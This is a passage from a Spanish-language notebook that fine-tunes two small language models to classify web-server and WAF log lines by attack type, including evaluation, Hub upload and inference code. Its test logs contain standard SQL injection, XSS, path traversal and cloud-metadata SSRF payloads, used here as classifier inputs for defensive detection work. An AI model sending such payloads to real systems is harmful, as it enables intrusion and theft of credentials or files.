          f"({stats.metrics['train_runtime']/60:.2f} min)")

    resultado_eval = evaluar_modelo(model, tokenizer, dataset_test, cfg["chat_kwargs"],
                                     max_ejemplos=max_ejemplos_eval)
    print(f"\nAccuracy binaria (es_ataque):  {resultado_eval['accuracy_binaria']*100:.1f}%")
    print(f"Accuracy de tipo de ataque:    {resultado_eval['accuracy_tipo']*100:.1f}%")
    print(f"Fallos de parseo de JSON:      {resultado_eval['fallos_parseo']} / {resultado_eval['n_evaluados']}")

    carpeta_adaptador = f"adaptador_{cfg['key']}"
    model.save_pretrained(carpeta_adaptador)
    tokenizer.save_pretrained(carpeta_adaptador)
    print(f"Adaptador LoRA guardado en: {carpeta_adaptador}/")

    # liberar VRAM antes de pasar al siguiente modelo
    del trainer, model
    gc.collect()
    torch.cuda.empty_cache()

    return {
        "key": cfg["key"],
        "model_id": cfg["model_id"],
        "train_runtime_s": stats.metrics["train_runtime"],
        "accuracy_binaria": resultado_eval["accuracy_binaria"],
        "accuracy_tipo": resultado_eval["accuracy_tipo"],
        "fallos_parseo": resultado_eval["fallos_parseo"],
        "n_evaluados": resultado_eval["n_evaluados"],
        "adaptador": carpeta_adaptador,
        "tokenizer_id": cfg["model_id"],
        "chat_kwargs": cfg["chat_kwargs"],
        "detalle_eval": resultado_eval["detalle"],
    }


### Correr el entrenamiento para los dos modelos

`PASOS_DEMO` funciona igual que en el cuaderno original: un numero chico
(por ejemplo 60) alcanza para una demo rapida en clase; para el fine-tuning
"de verdad" conviene poner `None` (usa las `num_train_epochs` completas) y
dejarlo correr sin apuro. Con modelos de este tamano y un dataset de ~1.900
ejemplos, incluso la corrida completa entra comoda en la cuota gratuita de
Colab (a diferencia del 20B, esto es cuestion de minutos, no de horas).


In [11]:
PASOS_DEMO = 60  # None = corrida completa (num_train_epochs=2)

resultados = []
for cfg in MODELOS:
    resultado = entrenar_y_evaluar(cfg, dataset_train, dataset_test, pasos_demo=PASOS_DEMO)
    resultados.append(resultado)
    print()


Modelo: tinyllama-1.1b -> unsloth/tinyllama-chat-bnb-4bit
==((====))==  Unsloth 2026.8.22: Fast Llama patching. Transformers: 5.5.0.
   \\   /|    Tesla T4. Num GPUs = 1. Max memory: 14.563 GB. Platform: Linux.
O^O/ \_/ \    Torch: 2.11.0+cu128. CUDA: 7.5. CUDA Toolkit: 12.8. Triton: 3.6.0
\        /    Bfloat16 = FALSE. FA [Xformers = 0.0.35. FA2 = False]
 "-____-"     Free license: http://github.com/unslothai/unsloth
Unsloth: Fast downloading is enabled - ignore downloading bars which are red colored!


Loading weights:   0%|          | 0/201 [00:00<?, ?it/s]

Unsloth: Will load unsloth/tinyllama-chat-bnb-4bit as a legacy tokenizer.
Unsloth 2026.8.22 patched 22 layers with 22 QKV layers, 22 O layers and 22 MLP layers.


Parametros entrenables: 12,615,680 / 628,221,952 totales


Map:   0%|          | 0/1471 [00:00<?, ? examples/s]

Tokenizing train dataset (num_proc=2):   0%|          | 0/1471 [00:00<?, ? examples/s]

TypeError: cannot pickle 'ConfigModuleInstance' object

### Comparacion final

In [ ]:
import matplotlib.pyplot as plt

print(f"{'Modelo':<15} {'Acc. binaria':>13} {'Acc. tipo':>11} {'Fallos JSON':>12} {'Tiempo train':>13}")
for r in resultados:
    print(f"{r['key']:<15} {r['accuracy_binaria']*100:>12.1f}% {r['accuracy_tipo']*100:>10.1f}% "
          f"{r['fallos_parseo']:>12} {r['train_runtime_s']:>11.1f}s")

etiquetas = [r["key"] for r in resultados]
acc_bin = [r["accuracy_binaria"] * 100 for r in resultados]
acc_tipo = [r["accuracy_tipo"] * 100 for r in resultados]

x = range(len(etiquetas))
ancho = 0.35
fig, ax = plt.subplots(figsize=(7, 4.5))
ax.bar([i - ancho/2 for i in x], acc_bin, ancho, label="Accuracy binaria (es_ataque)")
ax.bar([i + ancho/2 for i in x], acc_tipo, ancho, label="Accuracy de tipo de ataque")
ax.set_xticks(list(x))
ax.set_xticklabels(etiquetas)
ax.set_ylabel("Accuracy (%)")
ax.set_ylim(0, 100)
ax.set_title("TinyLlama-1.1B vs Qwen3-0.6B fine-tuned, tras el fine-tuning")
ax.legend()
plt.tight_layout()
plt.show()


**Como leer esto junto con el benchmark anterior (via Ollama + prompting):**
si la accuracy post fine-tuning supera de forma consistente lo que se lograba
con few-shot prompting, vale la pena mantener los adaptadores entrenados como
el clasificador de produccion. Si queda parecida o peor, probablemente
convenga seguir con el enfoque de prompting + JSON Schema (mas barato de
mantener, no requiere reentrenar cuando aparecen nuevos tipos de ataque) y
usar el fine-tuning solo para los casos donde el prompting mostro mas
inconsistencia entre corridas.


### Mirar los errores de clasificacion

Antes de dar por bueno un modelo, conviene ver *cuales* logs clasifica mal
— no solo el numero de accuracy. Un patron comun: confundir `sql_injection`
con `xss` cuando el payload viene en un parametro ambiguo, o fallar en
distinguir `ssrf` de `normal` cuando la URL objetivo "parece" legitima.


In [ ]:
for r in resultados:
    print("=" * 70)
    print(r["key"])
    print("=" * 70)
    errores = [d for d in r["detalle_eval"] if d[1] != d[2]]
    print(f"{len(errores)} errores de {r['n_evaluados']} evaluados\n")
    for log, esperado, predicho, texto_crudo in errores[:8]:
        print(f"log:       {log}")
        print(f"esperado:  {esperado}")
        print(f"predicho:  {predicho}")
        print(f"salida cruda del modelo: {texto_crudo!r}")
        print()


<a name="Save"></a>
### Guardar y exportar

Los adaptadores LoRA de cada modelo ya quedaron guardados localmente en
`adaptador_tinyllama-1.1b/` y `adaptador_qwen3-0.6b/` durante el
entrenamiento (ver `entrenar_y_evaluar`). Las celdas de abajo:

1. **Subida al Hub** — sube los adaptadores a `alcozzi/waf-classifier-<key>`.
   Corre automaticamente si esta seteada la variable de entorno `HF_TOKEN`
   (en Colab: menu de la izquierda -> Secrets -> agregar `HF_TOKEN` y activar
   "Notebook access", o desde codigo `os.environ["HF_TOKEN"] = "hf_..."`).
   Si no esta seteada, la celda no hace nada y avisa.
2. **Merge a 16 bits** — sigue en `if False`, porque solo hace falta si vas
   a servir el modelo con vLLM/transformers sin depender de Unsloth+PEFT.
   Pesa mucho mas que el adaptador solo.


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# Subida de los adaptadores LoRA al Hub de Hugging Face
#
# - Corre solo si esta seteado HF_TOKEN en el entorno (o en Colab Secrets).
# - Sube directamente la carpeta guardada en disco con `upload_folder`, sin
#   volver a cargar el modelo en memoria: es mas rapido y evita ocupar VRAM
#   solo para pushear archivos que ya estan en el filesystem.
# - Cada modelo va a su propio repo: alcozzi/waf-classifier-<key>.
# - Los repos se crean privados por default (privacidad conservadora); poner
#   `PRIVADO = False` si queres que sean publicos.
# ─────────────────────────────────────────────────────────────────────────────
import os

HF_USER = "alcozzi"
PRIVADO = True

# En Colab, si guardaste el token en Secrets, se puede recuperar asi:
if "HF_TOKEN" not in os.environ:
    try:
        from google.colab import userdata
        token_colab = userdata.get("HF_TOKEN")
        if token_colab:
            os.environ["HF_TOKEN"] = token_colab
    except Exception:
        pass

HF_TOKEN = os.environ.get("HF_TOKEN")

if not HF_TOKEN:
    print("HF_TOKEN no esta seteado. Nada que subir.")
    print("Para subir: setearlo en Colab Secrets (recomendado) o ejecutar antes")
    print('  os.environ["HF_TOKEN"] = "hf_..."')
else:
    from huggingface_hub import HfApi, create_repo

    api = HfApi(token=HF_TOKEN)
    for r in resultados:
        repo_id = f"{HF_USER}/waf-classifier-{r['key']}"
        create_repo(repo_id, token=HF_TOKEN, exist_ok=True, private=PRIVADO)
        api.upload_folder(
            folder_path=r["adaptador"],
            repo_id=repo_id,
            commit_message=(
                f"LoRA adapter — WAF log classifier fine-tuned sobre "
                f"{r['model_id']} (acc binaria {r['accuracy_binaria']*100:.1f}%, "
                f"acc tipo {r['accuracy_tipo']*100:.1f}%)"
            ),
            token=HF_TOKEN,
        )
        print(f"Subido: https://huggingface.co/{repo_id}")


In [ ]:
# ── Mergear a 16 bits (para servir con vLLM/transformers sin Unsloth) ──
if False:
    from unsloth import FastLanguageModel
    for r in resultados:
        modelo, tok = FastLanguageModel.from_pretrained(
            model_name=r["adaptador"], max_seq_length=LARGO_MAXIMO, load_in_4bit=True,
        )
        modelo.save_pretrained_merged(f"{r['key']}_merged_16bit", tok, save_method="merged_16bit")


<a name="Inference"></a>
### Inferencia: probar el clasificador con logs nuevos

`entrenar_y_evaluar` libera cada modelo de la GPU apenas termina (para que
el siguiente modelo tenga toda la VRAM disponible), asi que para probar
logs nuevos volvemos a cargar cada adaptador desde `adaptador_<key>/` — es
liviano porque los modelos base son chicos.


In [ ]:
LOGS_DE_PRUEBA = [
    '203.0.113.7 - - [15/Aug/2026:10:22:31 -0300] "GET /api/productos?id=17 HTTP/1.1" 200 512 "-" "Mozilla/5.0"',
    '198.51.100.4 - - [15/Aug/2026:10:23:02 -0300] "GET /buscar?q=%27%20OR%20%271%27%3D%271 HTTP/1.1" 403 210 "-" "sqlmap/1.7#stable"',
    '198.51.100.9 - - [15/Aug/2026:10:24:11 -0300] "GET /comentarios?comment=<script>alert(1)</script> HTTP/1.1" 403 198 "-" "Mozilla/5.0"',
    '198.51.100.3 - - [15/Aug/2026:10:25:44 -0300] "GET /upload?file=../../../../etc/passwd HTTP/1.1" 403 180 "-" "curl/8.4.0"',
    '198.51.100.1 - - [15/Aug/2026:10:26:19 -0300] "GET /api/pedidos?callback=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 403 220 "-" "python-requests/2.31.0"',
]

def clasificar_log(model, tokenizer, log, chat_kwargs):
    FastLanguageModel.for_inference(model)
    mensajes = [
        {"role": "system", "content": SYSTEM_PROMPT},
        {"role": "user", "content": log},
    ]
    inputs = tokenizer.apply_chat_template(
        mensajes, add_generation_prompt=True, return_tensors="pt",
        return_dict=True, **chat_kwargs,
    ).to(model.device)
    with torch.no_grad():
        salida = model.generate(**inputs, max_new_tokens=80, do_sample=False)
    texto = tokenizer.decode(salida[0][inputs["input_ids"].shape[1]:], skip_special_tokens=True)
    return extraer_json(texto), texto


In [ ]:
for r in resultados:
    print("=" * 70)
    print(r["key"])
    print("=" * 70)

    modelo_r, tok_r = FastLanguageModel.from_pretrained(
        model_name=r["adaptador"],
        max_seq_length=LARGO_MAXIMO,
        load_in_4bit=True,
    )

    for log in LOGS_DE_PRUEBA:
        pred, crudo = clasificar_log(modelo_r, tok_r, log, r["chat_kwargs"])
        print(log)
        print(" ->", pred if pred is not None else f"[no parseo] {crudo!r}")
        print()

    del modelo_r, tok_r
    gc.collect()
    torch.cuda.empty_cache()


In [ ]:
# ─────────────────────────────────────────────────────────────────────────────
# Comparacion lado a lado en los 5 logs de prueba.
#
# La celda anterior imprime las predicciones de cada modelo por separado.
# Aca las juntamos en una tabla con la etiqueta esperada, para ver de un
# vistazo en que ejemplos disienten los modelos (y contra que).
# ─────────────────────────────────────────────────────────────────────────────

# Etiqueta esperada de cada log de prueba, en el mismo orden que LOGS_DE_PRUEBA.
LOGS_ESPERADOS = [
    "normal",
    "sql_injection",
    "xss",
    "path_traversal",
    "ssrf",
]
assert len(LOGS_ESPERADOS) == len(LOGS_DE_PRUEBA), \
    "LOGS_ESPERADOS y LOGS_DE_PRUEBA tienen que tener el mismo largo"

# Cada modelo se carga UNA vez (no una vez por log) y se libera antes de pasar
# al siguiente, para no acumular VRAM.
predicciones = {r["key"]: [] for r in resultados}
for r in resultados:
    modelo_r, tok_r = FastLanguageModel.from_pretrained(
        model_name=r["adaptador"],
        max_seq_length=LARGO_MAXIMO,
        load_in_4bit=True,
    )
    for log in LOGS_DE_PRUEBA:
        pred, _ = clasificar_log(modelo_r, tok_r, log, r["chat_kwargs"])
        predicciones[r["key"]].append((pred or {}).get("tipo", "?"))
    del modelo_r, tok_r
    gc.collect()
    torch.cuda.empty_cache()

# --- tabla ---
claves = [r["key"] for r in resultados]
anchos = {k: max(len(k), *(len(p) for p in predicciones[k])) for k in claves}
ancho_esp = max(len("esperado"), *(len(e) for e in LOGS_ESPERADOS))

encabezado = (f"{'#':>2}  {'esperado':<{ancho_esp}}  "
              + "  ".join(f"{k:<{anchos[k]}}" for k in claves)
              + "  resultado")
print(encabezado)
print("-" * len(encabezado))
for i, esperado in enumerate(LOGS_ESPERADOS):
    preds_fila = [predicciones[k][i] for k in claves]
    if all(p == esperado for p in preds_fila):
        marca = "OK"
    else:
        fallaron = [k for k, p in zip(claves, preds_fila) if p != esperado]
        marca = "fallo: " + ", ".join(fallaron)
    fila = (f"{i+1:>2}  {esperado:<{ancho_esp}}  "
            + "  ".join(f"{p:<{anchos[k]}}" for p, k in zip(preds_fila, claves))
            + f"  {marca}")
    print(fila)

# --- resumen ---
print()
for k in claves:
    correctas = sum(1 for esp, pred in zip(LOGS_ESPERADOS, predicciones[k]) if pred == esp)
    print(f"{k:<15}  {correctas}/{len(LOGS_ESPERADOS)} correctas en los logs de prueba")


### Cargar un adaptador guardado en una sesion nueva

Si estas retomando este cuaderno despues de reiniciar el entorno (o en otra
maquina) y solo queres probar un modelo ya entrenado, no hace falta volver a
correr el entrenamiento: alcanza con el adaptador guardado en
`adaptador_<key>/`. Cambiar `if False` a `if True` para usarlo.


In [ ]:
if False:
    from unsloth import FastLanguageModel

    CARPETA_ADAPTADOR = "adaptador_qwen3-0.6b"  # o "adaptador_tinyllama-1.1b"
    CHAT_KWARGS = {"enable_thinking": False}      # {} para tinyllama

    modelo_cargado, tok_cargado = FastLanguageModel.from_pretrained(
        model_name=CARPETA_ADAPTADOR,
        max_seq_length=LARGO_MAXIMO,
        load_in_4bit=True,
    )

    for log in LOGS_DE_PRUEBA:
        pred, crudo = clasificar_log(modelo_cargado, tok_cargado, log, CHAT_KWARGS)
        print(log)
        print(" ->", pred if pred is not None else f"[no parseo] {crudo!r}")
        print()


## Conclusion

Fine-tuneaste **TinyLlama-1.1B** y **Qwen3-0.6B** para clasificar lineas de
log HTTP/WAF por tipo de ataque, y comparaste ambos entre si. Puntos clave:

1. **El cuello de botella cambio de lugar.** En el cuaderno de `gpt-oss-20b`
   el problema era la VRAM del modelo (20B parametros, MoE). Aca, con
   modelos densos de 1.1B y 0.6B, entrenar los dos en la misma sesion de T4
   es trivial — el trabajo se mudo a **la calidad y variedad del dataset**.
2. **Un dataset sintetico es un piso, no un techo.** Los payloads usados son
   los canonicos de cada categoria (los que se ensenan en cualquier curso de
   seguridad web); en produccion conviene mezclar esto con logs reales
   (propios o de un dataset como CSIC 2010) para cubrir variantes de
   ofuscacion/encoding que un generador basado en templates no genera solo.
3. **Salida estructurada entrenada vs. impuesta en inferencia.** El proyecto
   anterior lograba JSON valido forzando el `format` de Ollama con un JSON
   Schema. Aca el modelo *aprende* a emitir ese JSON — vale la pena mirar la
   columna de `fallos_parseo` en los resultados: si sigue siendo alta,
   probablemente convenga combinar las dos tecnicas (fine-tuning +
   decodificacion restringida por schema) en vez de elegir una sola.
4. **`train_on_responses_only` importa tanto aca como en el cuaderno
   original**, aunque el motivo cambia: no es para "elegir que canal
   aprender" (no hay canales `analysis`/`final` en un log), es para que el
   modelo no gaste capacidad aprendiendo a repetir el prompt de sistema y la
   linea de log, y la concentre en la clasificacion en si.

**Proximos pasos:** curar un conjunto de validacion separado del de test
(este cuaderno solo separa train/test), evaluar por pasos
(`eval_strategy="steps"`) para elegir el mejor checkpoint por `eval_loss` en
vez de por el ultimo paso, y — si el resultado supera al enfoque de
prompting — integrar el adaptador ganador al pipeline existente de
clasificacion de logs WAF en lugar de (o ademas de) la llamada a Ollama.

### Referencias
- Guia de Unsloth para fine-tuning: https://docs.unsloth.ai/basics/gpt-oss-how-to-run-and-fine-tune/
- Catalogo de modelos de Unsloth (incluye TinyLlama y Qwen3): https://unsloth.ai/docs/get-started/unsloth-model-catalog
